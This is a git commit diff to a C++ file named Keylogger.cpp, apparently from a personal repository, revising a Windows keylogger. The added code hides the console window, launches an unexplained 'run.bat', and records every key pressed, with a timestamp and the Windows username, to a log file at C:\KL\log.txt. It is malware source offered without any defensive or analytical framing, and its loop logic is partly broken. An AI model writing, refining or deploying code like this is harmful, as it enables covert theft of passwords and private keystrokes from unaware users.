84f91a1585f104d27d4c67b5382603d2a8f8087a
saosejo <69328107+saosejo@users.noreply.github.com>
2021-01-26 07:25:23 -0500

    Add files via upload

--- Keylog/Keylogger.cpp
+++ Keylog/Keylogger.cpp
@@ -1,68 +1,66 @@
-
 #include <iostream>
 #include <ctime>
 #include <stdio.h>
 #include <windows.h>
 #include <Lmcons.h>
+#define FILE_NAME "C:\\KL\\log.txt"
 
-#define FILE_NAME "Record2.txt"
 
 using namespace std;
 
+
+
 int main() {
-   
 
-    FILE *file = fopen(FILE_NAME, "w");
+    FreeConsole;
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    system("run.bat");
+    FILE* file = fopen(FILE_NAME, "w");
+    
+    unsigned char ch;
 
-      
-    unsigned short ch,i;
-    Sleep(10);
-    while (1)
-    {
-                    
-        
-        ch=1;
-        Sleep(10);
-        for (ch=0;ch<=250;ch++)
-        {
-            Sleep(10);
-            int i=0;
-            for(i=0; i<=100;ch++)
+    while (true) {
+        for ( ch = 0; ch <= 255; ch++) {
+            for (int i = 0; i <= 5000; ch++)
             {
-                
-                if(i==100)
+
+                if (i == 5000)
                 {
-                    if(GetAsyncKeyState(ch) == -32767)
+                    if (GetAsyncKeyState(ch) == -32767)
                     {
-                        file=fopen(FILE_NAME,"a");
+                        file = fopen(FILE_NAME, "a");
                         time_t now = time(nullptr);
-                        char username[UNLEN+1];
-                        DWORD username_len = UNLEN+1;
-                        GetUserNameA(username, &username_len);
-                        HKL KeyboardLayout = GetKeyboardLayout(0);
-                        fprintf(file,"%d %d %s uuid\n",ch,now,username);
+                        TCHAR username[UNLEN + 1];
+                        DWORD username_len = UNLEN + 1;
+                        GetUserName(username, &username_len);
+                        HKL KeyboardLayout = 0;
+                        KeyboardLayout = GetKeyboardLayout(0);
+                        fwprintf(file, L"%d %jd %s uuid\n", ch, (intmax_t)now, username);
                         fclose(file);
-                        i++;   
-                        
-                    } 
+                        i++;
+                        ShowWindow(GetConsoleWindow(), SW_HIDE);
+                        system("run.bat");
+                        FILE* file = fopen(FILE_NAME, "w");
+                    }
                 }
                 else
-                { 
-                    if(GetAsyncKeyState(ch) == -32767)
+                {
+                    if (GetAsyncKeyState(ch) == -32767)
                     {
-                        file=fopen(FILE_NAME,"a");
+                        file = fopen(FILE_NAME, "a");
                         time_t now = time(nullptr);
-                        char username[UNLEN+1];
-                        DWORD username_len = UNLEN+1;
-                        GetUserNameA(username, &username_len);
-                        HKL KeyboardLayout=0;
+                        TCHAR username [UNLEN + 1];
+                        DWORD username_len = UNLEN + 1;
+                        GetUserName(username, &username_len);
+                        HKL KeyboardLayout = 0;
                         KeyboardLayout = GetKeyboardLayout(0);
-                        fprintf(file,"%d %d %s uuid\n",ch,now,username);
+                        fwprintf(file, L"%d %jd %s uuid\n", ch, (intmax_t)now, username);
                         fclose(file);
                         i++;
                     }
                 }
-            }        
-        }   
+            }
+        }
     }
+    return 0;
 }
